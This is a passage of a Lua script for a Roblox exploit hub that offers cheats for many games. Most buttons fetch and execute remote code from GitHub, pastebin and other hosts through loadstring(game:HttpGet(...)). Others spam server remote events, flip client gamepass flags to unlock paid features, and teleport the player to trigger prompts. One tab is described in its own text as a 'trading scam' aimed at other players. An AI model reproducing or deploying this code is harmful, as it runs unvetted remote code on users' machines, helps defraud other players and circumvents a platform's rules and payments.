                        game.Players.LocalPlayer.SimulationRadius = math.huge * math.huge, math.huge * math.huge * 0 / 0 * 0 / 0 * 0 / 0 * 0 / 0 * 0 / 0
                    end
                end
            end)
        end
    end
})

local Section = Tab:AddSection({"Race"})

local RunService = game:GetService("RunService")
local Toggle = Tab:AddToggle({
    Name = "Auto V3 Ability",
    Default = false,
    Callback = function(Value)
        if Value then
            -- Start the loop when the toggle is enabled
            Toggle.Loop = RunService.RenderStepped:Connect(function()
                local args = {
    [1] = "ActivateAbility"
}

game:GetService("ReplicatedStorage").Remotes.CommE:FireServer(unpack(args))
            end)
        else
            -- Stop the loop when the toggle is disabled
            if Toggle.Loop then
                Toggle.Loop:Disconnect()
                Toggle.Loop = nil
            end
        end
    end
})

local Tab = Window:MakeTab({"lumber tycoon 2"})

Tab:AddButton({ 	Name = "lumber tycoon 2 butter", 	Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/Butterisgood/Butter/main/Root2.lua'))("")
end })

Tab:AddParagraph("imformation","is a lumber tycoon 2 script")

local Tab = Window:MakeTab({"mm2"})

Tab:AddButton({ 	Name = "mm2 small", 	Callback = function() loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Drifter0507/GUIS/main/MURDER%20MYSTERY%202", true))();

end })

Tab:AddParagraph("imformation","is an mm2 script")

Tab:AddButton({ 	Name = "mm2 shub hub", 	Callback = function() local a,b,c,d=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,"https://itsjidy.github.io/SymphonyHub/Loader.html"c(a and b, "Your Executor does not support.")a(b({Url=d,Method="GET"}).Body)()

end })

Tab:AddParagraph("imformation","is a mm2 script")

local Tab = Window:MakeTab({"prison life"})

Tab:AddButton({ 	Name = "Prison ware v3", 	Callback = function() 		loadstring(game:HttpGet("https://raw.githubusercontent.com/Denverrz/scripts/master/PRISONWARE_v1.3.txt"))();	end })

Tab:AddParagraph("imformation","is an prison life script")

local Tab = Window:MakeTab({"break in"})

Tab:AddButton({ 	Name = "break in", 	Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Bebo-Mods/XHub/main/HubLoader.lua", true))()

end })

Tab:AddParagraph("imformation","is a break in script")

Tab:AddButton({ 	Name = "break in 2", 	Callback = function()
game:HttpGet("https://getexploits.com/cexecution/669295117747900416")

loadstring(game:HttpGet("https://raw.githubusercontent.com/memejames/Hide/main/Break%20in%202"))()
end })

Tab:AddParagraph("imformation","is a break in script")

local Tab = Window:MakeTab({"doors"})

Tab:AddButton({ 	Name = "Doors", 	Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Darkrai-X/main/Games/Doors"))()

end })

Tab:AddParagraph("imformation","is a doors script")

local Tab = Window:MakeTab({"age of heros"})

Tab:AddButton({ 	Name ="age of hero ", 	Callback = function() loadstring(game:HttpGet(("https://raw.githubusercontent.com/icuck/AgeofHeroesAutofarm/master/main.lua"), true))()

end})

Tab:AddParagraph("imformation","is a age of hero script")

local Tab = Window:MakeTab({"cook burger"})

local Section = Tab:AddSection({"Guis"})

Tab:AddButton({ 	Name = "cook buger 1", 	Callback = function() loadstring(game:HttpGet("https://pastebin.com/raw/bRzAYkYZ"))()

end })

Tab:AddParagraph("imformation","is a cook burger script")


Tab:AddButton({ 	Name = "cook buger 2", 	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/NOOBARMYSCRIPTER/NOOBARMYSCRIPTER/main/cook%20burgers", true))()
end })


local Section = Tab:AddSection({"Scripts"})

local Section = Tab:AddSection({"Auto"})

local RunService = game:GetService("RunService")
local Toggle = Tab:AddToggle({
    Name = "Auto Spawn Plates",
    Default = false,
    Callback = function(Value)
        if Value then
            -- Start the loop when the toggle is enabled
            Toggle.Loop = RunService.RenderStepped:Connect(function()
                         workspace.Restaurant.PlateDispenser.DispenserButton.ContextAction:FireServer()
            end)
        else
            -- Stop the loop when the toggle is disabled
            if Toggle.Loop then
                Toggle.Loop:Disconnect()
                Toggle.Loop = nil
            end
        end
    end
})

local RunService = game:GetService("RunService")
local Toggle = Tab:AddToggle({
    Name = "Auto Open Boxs",
    Default = false,
    Callback = function(Value)
        if Value then
            -- Start the loop when the toggle is enabled
            Toggle.Loop = RunService.RenderStepped:Connect(function()
                         workspace.Entities.Items.Box.ContextAction:FireServer()
            end)
        else
            -- Stop the loop when the toggle is disabled
            if Toggle.Loop then
                Toggle.Loop:Disconnect()
                Toggle.Loop = nil
            end
        end
    end
})

local RunService = game:GetService("RunService")
local Toggle = Tab:AddToggle({
    Name = "Auto Order Buns",
    Default = false,
    Callback = function(Value)
        if Value then
            -- Start the loop when the toggle is enabled
            Toggle.Loop = RunService.RenderStepped:Connect(function()
                      workspace.Restaurant.IngredientsOrderScreens.MainScreen.OrderButton1.ContextAction:FireServer()
            end)
        else
            -- Stop the loop when the toggle is disabled
            if Toggle.Loop then
                Toggle.Loop:Disconnect()
                Toggle.Loop = nil
            end
        end
    end
})
local RunService = game:GetService("RunService")
local Toggle = Tab:AddToggle({
    Name = "Auto Order Meat & Cheese",
    Default = false,
    Callback = function(Value)
        if Value then
            -- Start the loop when the toggle is enabled
            Toggle.Loop = RunService.RenderStepped:Connect(function()
              workspace.Restaurant.IngredientsOrderScreens.MainScreen.OrderButton2.ContextAction:FireServer()
            end)
        else
            -- Stop the loop when the toggle is disabled
            if Toggle.Loop then
                Toggle.Loop:Disconnect()
                Toggle.Loop = nil
            end
        end
    end
})
local RunService = game:GetService("RunService")
local Toggle = Tab:AddToggle({
    Name = "Auto Order Fries",
    Default = false,
    Callback = function(Value)
        if Value then
            -- Start the loop when the toggle is enabled
            Toggle.Loop = RunService.RenderStepped:Connect(function()
                          workspace.Restaurant.IngredientsOrderScreens.FreezerScreen.OrderButton4.ContextAction:FireServer()
            end)
        else
            -- Stop the loop when the toggle is disabled
            if Toggle.Loop then
                Toggle.Loop:Disconnect()
                Toggle.Loop = nil
            end
        end
    end
})
local RunService = game:GetService("RunService")
local Toggle = Tab:AddToggle({
    Name = "Auto Order Lettuce",
    Default = false,
    Callback = function(Value)
        if Value then
            -- Start the loop when the toggle is enabled
            Toggle.Loop = RunService.RenderStepped:Connect(function()
            workspace.Restaurant.IngredientsOrderScreens.MainScreen.OrderButton3.ContextAction:FireServer()
            end)
        else
            -- Stop the loop when the toggle is disabled
            if Toggle.Loop then
                Toggle.Loop:Disconnect()
                Toggle.Loop = nil
            end
        end
    end
})

local Section = Tab:AddSection({"Order"})

local Button = Tab:AddButton({
  Name = "Lettuce",
  Callback = function()
    workspace.Restaurant.IngredientsOrderScreens.MainScreen.OrderButton3.ContextAction:FireServer()
  end
})
local Button = Tab:AddButton({
  Name = "Meat & Cheese",
  Callback = function()
    workspace.Restaurant.IngredientsOrderScreens.MainScreen.OrderButton2.ContextAction:FireServer()
  end
})
local Button = Tab:AddButton({
  Name = "Top & Bottom Buns",
  Callback = function()
    workspace.Restaurant.IngredientsOrderScreens.MainScreen.OrderButton1.ContextAction:FireServer()
  end
})
local Button = Tab:AddButton({
  Name = "Fries",
  Callback = function()
    workspace.Restaurant.IngredientsOrderScreens.FreezerScreen.OrderButton4.ContextAction:FireServer()
  end
})

local Section = Tab:AddSection({"Become"})

local Button = Tab:AddButton({
  Name = "Become A Rat",
  Callback = function()
    workspace.Entities.Items.Potion.ContextAction:FireServer()
  end
})



local Section = Tab:AddSection({"Doors"})

local Button = Tab:AddButton({
  Name = "Open/Close Back Door",
  Callback = function()
    local args = {
    [1] = "gameplay.interaction",
    [2] = {
        ["with"] = workspace.Restaurant.InteractiveDoor,
        ["side"] = -90
    }
}

game:GetService("ReplicatedStorage").Libs.Events.RemoteEvent:FireServer(unpack(args))

  end
})

local Button = Tab:AddButton({
  Name = "Open/CloseMicrowave Door",
  Callback = function()
   workspace.Entities.Items.Microwave.Body.ContextAction:FireServer()
  end
})
local Button = Tab:AddButton({
  Name = "Open/Close Frige Door",
  Callback = function()
    workspace.Restaurant.Fridge.Door.FridgeDoor.ContextAction:FireServer()
  end
})
local Button = Tab:AddButton({
  Name = "Open/Close Freezer Door",
  Callback = function()
    workspace.Restaurant.Freezer.Door.FreezerDoor.ContextAction:FireServer()
  end
})


local Section = Tab:AddSection({"GamePasses"})

local Button = Tab:AddButton({
  Name = "Manager",
  Callback = function()
    local player = game:GetService("Players").LocalPlayer
player.Gamepasses.ManagerAccess.Value = true

game.StarterGui:SetCore("SendNotification", {
    Title = "About The Game Passes";
 
   
})
wait(1)
game.StarterGui:SetCore("SendNotification", {
    Title = "Not Working ";
    Text = "some game passes don't work because of certain restrictions from server";
    Duration = 60;
})
  end
})
local Button = Tab:AddButton({
  Name = "Instant Cat",
  Callback = function()
    local player = game:GetService("Players").LocalPlayer
player.Gamepasses.InstantCat.Value = true

  end
})
local Button = Tab:AddButton({
  Name = "X27Prototype",
  Callback = function()
    local player = game:GetService("Players").LocalPlayer
player.Gamepasses.X27Prototype.Value = true

  end
})
local Button = Tab:AddButton({
  Name = "Royal Rate",
  Callback = function()
    local player = game:GetService("Players").LocalPlayer
player.Gamepasses.RoyalRat.Value = true
  end
})
local Button = Tab:AddButton({
  Name = "Elite Rate",
  Callback = function()
    local player = game:GetService("Players").LocalPlayer
player.Gamepasses.EliteRat.Value = true
  end
})

local Section = Tab:AddSection({"Bring"})

local Button = Tab:AddButton({
  Name = "bring all bottom buns",
  Callback = function()
    local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

if character then
    local rootPart = character:WaitForChild("HumanoidRootPart")
    local offset = Vector3.new(0, 0, 0) -- Adjust this to set the distance in front of the player

    -- First, anchor all BottomBuns to prevent movement
    for _, v in pairs(workspace:GetDescendants()) do
        if v.Name == "Bottom Bun" and v:IsA("BasePart") then
            v.Anchored = true
        end
    end

    -- Then, teleport all BottomBuns at once
    for _, v in pairs(workspace:GetDescendants()) do
        if v.Name == "Bottom Bun" and v:IsA("BasePart") then
            v.CFrame = rootPart.CFrame * CFrame.new(offset)
            offset = offset + Vector3.new(0, v.Size.Y, 0) -- Stack vertically
        end
    end

    -- Finally, re-enable physics for all BottomBuns
    for _, v in pairs(workspace:GetDescendants()) do
        if v.Name == "Bottom Bun" and v:IsA("BasePart") then
            v.Anchored = false
        end
    end
end

  end
})

local Button = Tab:AddButton({
  Name = "Button",
  Callback = function()
        local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

if character then
    local rootPart = character:WaitForChild("HumanoidRootPart")
    local offset = Vector3.new(0, 0, 5) -- Adjust this to set the distance in front of the player

    -- First, anchor all BottomBuns to prevent movement
    for _, v in pairs(workspace:GetDescendants()) do
        if v.Name == "Bottom Bun" and v:IsA("BasePart") then
            v.Anchored = true
        end
    end

    -- Then, teleport all BottomBuns at once
    for _, v in pairs(workspace:GetDescendants()) do
        if v.Name == "Bottom Bun" and v:IsA("BasePart") then
            v.CFrame = rootPart.CFrame * CFrame.new(offset)
            offset = offset + Vector3.new(0, v.Size.Y, 0) -- Stack vertically
        end
    end

    -- Finally, re-enable physics for all BottomBuns
    for _, v in pairs(workspace:GetDescendants()) do
        if v.Name == "Bottom Bun" and v:IsA("BasePart") then
            v.Anchored = false
        end
    end
end

  
  end
})
local Button = Tab:AddButton({
  Name = "crate",
  Callback = function()
        local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

if character then
    local rootPart = character:WaitForChild("HumanoidRootPart")
    local offset = Vector3.new(0, 0, 5) -- Adjust this to set the distance in front of the player

    -- First, anchor all BottomBuns to prevent movement
    for _, v in pairs(workspace:GetDescendants()) do
        if v.Name == "Crate" and v:IsA("BasePart") then
            v.Anchored = true
        end
    end

    -- Then, teleport all BottomBuns at once
    for _, v in pairs(workspace:GetDescendants()) do
        if v.Name == "Crate" and v:IsA("BasePart") then
            v.CFrame = rootPart.CFrame * CFrame.new(offset)
            offset = offset + Vector3.new(0, v.Size.Y, 0) -- Stack vertically
        end
    end

    -- Finally, re-enable physics for all BottomBuns
    for _, v in pairs(workspace:GetDescendants()) do
        if v.Name == "Crate" and v:IsA("BasePart") then
            v.Anchored = false
        end
    end
end

 
  end
})
local Button = Tab:AddButton({
  Name = "Cargo",
  Callback = function()
        local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

if character then
    local rootPart = character:WaitForChild("HumanoidRootPart")
    local offset = Vector3.new(0, 0, 5) -- Adjust this to set the distance in front of the player

    -- First, anchor all BottomBuns to prevent movement
    for _, v in pairs(workspace:GetDescendants()) do
        if v.Name == "Bottom Bun" and v:IsA("BasePart") then
            v.Anchored = true
        end
    end

    -- Then, teleport all BottomBuns at once
    for _, v in pairs(workspace:GetDescendants()) do
        if v.Name == "Bottom Bun" and v:IsA("BasePart") then
            v.CFrame = rootPart.CFrame * CFrame.new(offset)
            offset = offset + Vector3.new(0, v.Size.Y, 0) -- Stack vertically
        end
    end

    -- Finally, re-enable physics for all BottomBuns
    for _, v in pairs(workspace:GetDescendants()) do
        if v.Name == "Bottom Bun" and v:IsA("BasePart") then
            v.Anchored = false
        end
    end
end

 
  end
})


local Section = Tab:AddSection({"Soon"})

local Section = Tab:AddSection({"Soon"})

local Tab = Window:MakeTab({"pop it trading"})

Tab:AddButton({ 	Name = "popit gui", 	Callback = function()

loadstring(game:HttpGet("https://pastebin.com/raw/0h2eAbfi"))()

end})

Tab:AddParagraph("imformation","")

Tab:AddParagraph("info","it just a trading scam but you have to reset after using also it will let you see value's")

local Tab = Window:MakeTab({"brookhaven"})

Tab:AddButton({ 	Name = "Brookhaven", 	Callback = function() loadstring(game:HttpGet(('https://raw.githubusercontent.com/sXPiterXs1111/Sanderxv3.30/main/sanderx3.30')))()	end })

Tab:AddParagraph("imformation","is a brookhaven script")

local Tab = Window:MakeTab({"legends of speed"})

Tab:AddButton({ 	Name = "Legends Of Speed", 	Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/fareljr1/Hub/main/Loader"))()	end })

Tab:AddParagraph("imformation","is a legend of speed gui")





Tab:AddParagraph("LegendsOfSpeedkey","key:SUBSCRIBERELZBLOX")

local Tab = Window:MakeTab({"area 51"})

Tab:AddButton({ 	Name = "Area 51", 	Callback = function() --Subcribe To Kyojean

--Credits To Owner

loadstring(game:HttpGet('https://pastebin.com/raw/TtdvYAKU'))()

end})

Tab:AddParagraph("imformation","is a area 51 script")

Tab:AddButton({ 	Name = "Darkrai X", 	Callback = function()

      loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Saktk-In-Area51/main/Area51", true))()

end})

Tab:AddParagraph("imformation","is a area 51 script")

local Tab = Window:MakeTab({"shark bite 2"})

Tab:AddButton({ 	Name = "sharkbite 2 auto farm", 	Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Sw1ndlerScripts/RobloxScripts/main/Misc%20Scripts/sharkbite2.lua",true))()

end})

Tab:AddParagraph("imformation","is a shark bite 2 script")

Tab:AddButton({ name = "Shark Bite 2 Gui", Callback = function()

loadstring(game:HttpGet("https://raw.githubusercontent.com/raimbowo1/test/main/naval"))()

end})


local Tab = Window:MakeTab({"find the marker"})

Tab:AddButton({ 	Name = "find the marker gui", 	Callback = function()

loadstring(game:HttpGet('https://pastebin.com/raw/7gu2ztpP'))()

end})
Tab:AddParagraph("imformation","is a find the marker gui")

local Tab = Window:MakeTab({"Build a boat"})
Tab:AddButton({ 	Name = "BHH on Top Build a boat", 	Callback = function()

 loadstring(game:HttpGet("https://raw.githubusercontent.com/catblox1346/BBHscript/main/owo?token=$(date%20+%s)"))()

-- Thanks for using my script

-- !!! IMPORTANT !!!
-- YOU NEED ALL THE TOOLS IN THE GAME FOR THE SCRIPT TO WORK!!!

end})
Tab:AddButton({ 	Name = "Build a boat", 	Callback = function()

loadstring(game:HttpGet("https://raw.githubusercontent.com/SandaFrosty/Dino-Script/main/Build-Boat-For-Treasure"))()

end})

Tab:AddButton({ 	Name = "Auto Farm Gold", 	Callback = function()
loadstring(game:HttpGet("https://waza-scripts.vercel.app/script/BuildABoat"))()
end })



Tab:AddParagraph("is a build a boat script not as good")


local Tab = Window:MakeTab({ "Push Dummies"})

Tab:AddButton({ 	Name = "Push Dummies 1", 	Callback = function()

loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/Push-Dummies-In-The-Sparta-Hole/main/FireInTheHole"))()

end})

Tab:AddParagraph("imformation","is a Push Dummies Down The Sparta Hole script")

local Tab = Window:MakeTab({"Hide and seek"})

Tab:AddButton({ 	Name = "Hide and seek 1", 	Callback = function()

loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Hide%20And%20Seek%20Extreme'))()

end})

Tab:AddParagraph("imformation","is a Hide and Seek Extreme script")

local Tab = Window:MakeTab({"Muscle legends"})


Tab:AddButton({ 	Name = "Muscle legends", 	Callback = function()

loadstring(game:HttpGet("https://raw.githubusercontent.com/SandaFrosty/Dino-Script/main/Build-Boat-For-Treasure"))()

end})

Tab:AddParagraph("imformation","is a muscle legends script")

local Tab = Window:MakeTab({"Envade"})

Tab:AddButton({ 	Name = "Envade", 	Callback = function()

loadstring(game:HttpGet("https://raw.githubusercontent.com/xdevslasher/xyz.evade/main/xyz.evade.lua",true))()

end})

Tab:AddParagraph("imformation","is an evade script")

local Tab = Window:MakeTab({"Blade Ball"})

Tab:AddButton({ 	Name = "Neo. c hub", 	Callback = function()

loadstring(game:HttpGet("https://raw.githubusercontent.com/Neoncat765/Neon.C-Hub-V5/main/UpdatedVersion"))();

end})

Tab:AddButton({ name = "Auto Parry", Callback = function()

loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/5ebefab5c68bfa67271dcbf6430d3c7d.lua"))()

end})


local Tab = Window:MakeTab({"Piggy"})


Tab:AddButton({ 	Name = "Piggy Peppa", 	Callback = function() loadstring(game:HttpGet("https://scriptblox.com/raw/Piggy-Peppa-script-8586"))()

end })

Tab:AddParagraph("imformation","is a piggy script")

local Tab = Window:MakeTab({"Barrys prison run"})

Tab:AddButton({ 	Name = "Barrys prison 1", 	Callback = function()
      loadstring(game:HttpGet(('https://pastebin.com/raw/8eqS0bAQ')))()

end })

Tab:AddParagraph("imformation","is a Barrys prison run script")

local Tab = Window:MakeTab({"Natural Disaster"})

Tab:AddButton({ 	Name = "Natural Disaster 1", 	Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/JustAP1ayer/PlayerHubOther/main/PlayerHubLoader.lua"))()

end })

Tab:AddParagraph("imformation","is a Natural Disaster script")
local Tab = Window:MakeTab({"break in 2"})
Tab:AddButton({ 	Name = "breaking bliz", 	Callback = function()
      
loadstring(game:HttpGet("https://raw.githubusercontent.com/RScriptz/RobloxScripts/main/BreakIn2.lua"))()
end })

local Tab = Window:MakeTab({"The Chosen one"})
Tab:AddButton({ Name = "The Lazy One", Callback = function()

loadstring(game:HttpGet("https://raw.githubusercontent.com/FlavorYT/The-lazy-ONE/main/Made%20by%20leakz%20and%20EvilAlienWare"))()


end})

local Tab = Window:MakeTab({"Ro-Bio Virus Injection"})
local Section = Tab:AddSection({
	Name = "Event Viruses"
})
Tab:AddButton({ 	Name = "Grimace", 	Callback = function()
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

local originalPosition = humanoidRootPart.Position

local modulePosition = Vector3.new(-559.7681884765625, 227.59332275390625, 324.9228515625)


local function teleportToModule()
    humanoidRootPart.CFrame = CFrame.new(modulePosition)
end

local function teleportBack()
    humanoidRootPart.CFrame = CFrame.new(originalPosition)
end


teleportToModule()

wait(0.2)
teleportBack()
fireproximityprompt(workspace.GrimaceVirus.Grimace.ProximityPrompt)
end})

Tab:AddButton({ 	Name = "Santa", 	Callback = function()

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

local originalPosition = humanoidRootPart.Position

local modulePosition = Vector3.new(-561.6045532226562, 210.31768798828125, 324.4326171875)


local function teleportToModule()
    humanoidRootPart.CFrame = CFrame.new(modulePosition)
end

local function teleportBack()
    humanoidRootPart.CFrame = CFrame.new(originalPosition)
end


teleportToModule()

wait(0.2)
teleportBack()
fireproximityprompt(workspace.Map.Decorations:GetChildren()[19].Viruses.Santa.Santa.ProximityPrompt)

end})


 

Tab:AddButton({ 	Name = "Candy Cane", 	Callback = function()

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

local originalPosition = humanoidRootPart.Position

local modulePosition = Vector3.new(-559.798583984375, 210.31768798828125, 324.4091796875)


local function teleportToModule()
    humanoidRootPart.CFrame = CFrame.new(modulePosition)
end

local function teleportBack()
    humanoidRootPart.CFrame = CFrame.new(originalPosition)
end


teleportToModule()

wait(0.2)
teleportBack()
fireproximityprompt(workspace.Map.Decorations:GetChildren()[19].Viruses.CandyCane.CandyCane.ProximityPrompt)

end})



Tab:AddButton({ 	Name = "Gift", 	Callback = function()

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

local originalPosition = humanoidRootPart.Position

local modulePosition = Vector3.new(-558.1112060546875, 210.31768798828125, 324.387451171875)


local function teleportToModule()
    humanoidRootPart.CFrame = CFrame.new(modulePosition)
end

local function teleportBack()
    humanoidRootPart.CFrame = CFrame.new(originalPosition)
end


teleportToModule()

wait(0.2)
teleportBack()
fireproximityprompt(workspace.Map.Decorations:GetChildren()[19].Viruses.Gift.Gift.ProximityPrompt)

end})



Tab:AddButton({ 	Name = "Vampire", 	Callback = function()

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

local originalPosition = humanoidRootPart.Position

local modulePosition = Vector3.new(-562.4117431640625, 200.25689697265625, 324.4429931640625)


local function teleportToModule()
    humanoidRootPart.CFrame = CFrame.new(modulePosition)
end

local function teleportBack()
    humanoidRootPart.CFrame = CFrame.new(originalPosition)
end


teleportToModule()

wait(0.2)
teleportBack()
fireproximityprompt(workspace.Map.Decorations:GetChildren()[15].Viruses.Vampire.Vampire.ProximityPrompt)

end})



Tab:AddButton({ 	Name = "Pumpkin", 	Callback = function()

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

local originalPosition = humanoidRootPart.Position

local modulePosition = Vector3.new(-560.6494140625, 200.25689697265625, 324.420166015625)


local function teleportToModule()
    humanoidRootPart.CFrame = CFrame.new(modulePosition)
end

local function teleportBack()
    humanoidRootPart.CFrame = CFrame.new(originalPosition)
end


teleportToModule()

wait(0.2)
teleportBack()
fireproximityprompt(workspace.Map.Decorations:GetChildren()[15].Viruses.Pumpkin.Pumpkin.ProximityPrompt)

end})


Tab:AddButton({ 	Name = "Sweet", 	Callback = function()

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

local originalPosition = humanoidRootPart.Position

local modulePosition = Vector3.new(-558.8995361328125, 200.25689697265625, 324.3975830078125)


local function teleportToModule()
    humanoidRootPart.CFrame = CFrame.new(modulePosition)
end

local function teleportBack()
    humanoidRootPart.CFrame = CFrame.new(originalPosition)
end


teleportToModule()

wait(0.2)
teleportBack()
fireproximityprompt(workspace.Map.Decorations:GetChildren()[15].Viruses.Sweetieidklol.Sweet.ProximityPrompt)

end})



Tab:AddButton({ 	Name = "Witch", 	Callback = function()

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

local originalPosition = humanoidRootPart.Position

local modulePosition = Vector3.new(-557.212158203125, 200.25689697265625, 324.3758544921875)


local function teleportToModule()
    humanoidRootPart.CFrame = CFrame.new(modulePosition)
end

local function teleportBack()
    humanoidRootPart.CFrame = CFrame.new(originalPosition)
end


teleportToModule()

wait(0.2)
teleportBack()
fireproximityprompt(workspace.Map.Decorations:GetChildren()[15].Viruses.Witch.Witch.ProximityPrompt)

end})



Tab:AddButton({ 	Name = "Toilet", 	Callback = function()
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

local originalPosition = humanoidRootPart.Position

local modulePosition = Vector3.new(-563.0225219726562, 180.00335693359375, 343.88922119140625)


local function teleportToModule()
    humanoidRootPart.CFrame = CFrame.new(modulePosition)
end

local function teleportBack()
    humanoidRootPart.CFrame = CFrame.new(originalPosition)
end


teleportToModule()

wait(0.2)
teleportBack()
fireproximityprompt(workspace.Map.Decorations:GetChildren()[25].Viruses.Toilet.Toilet.ProximityPrompt)


end})

Tab:AddButton({ 	Name = "SuperSpeed", 	Callback = function()

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

local originalPosition = humanoidRootPart.Position

local modulePosition = Vector3.new(-568.6893920898438, 180.35699462890625, 343.861572265625)


local function teleportToModule()
    humanoidRootPart.CFrame = CFrame.new(modulePosition)
end

local function teleportBack()
    humanoidRootPart.CFrame = CFrame.new(originalPosition)
end


teleportToModule()

wait(0.2)
teleportBack()
fireproximityprompt(workspace.Map.Decorations:GetChildren()[25].Viruses.Speed.SuperSpeed.ProximityPrompt)

end})

local Tab = Window:MakeTab({"Horrors RNG"})

local RunService = game:GetService("RunService")
local Toggle = Tab:AddToggle({
    Name = "Auto Luck",
    Default = false,
    Callback = function(Value)
        if Value then
            -- Start the loop when the toggle is enabled
            Toggle.Loop = RunService.RenderStepped:Connect(function()
          print('soon')
            end)
        else
            -- Stop the loop when the toggle is disabled
            if Toggle.Loop then
                Toggle.Loop:Disconnect()
                Toggle.Loop = nil
            end
        end
    end
})


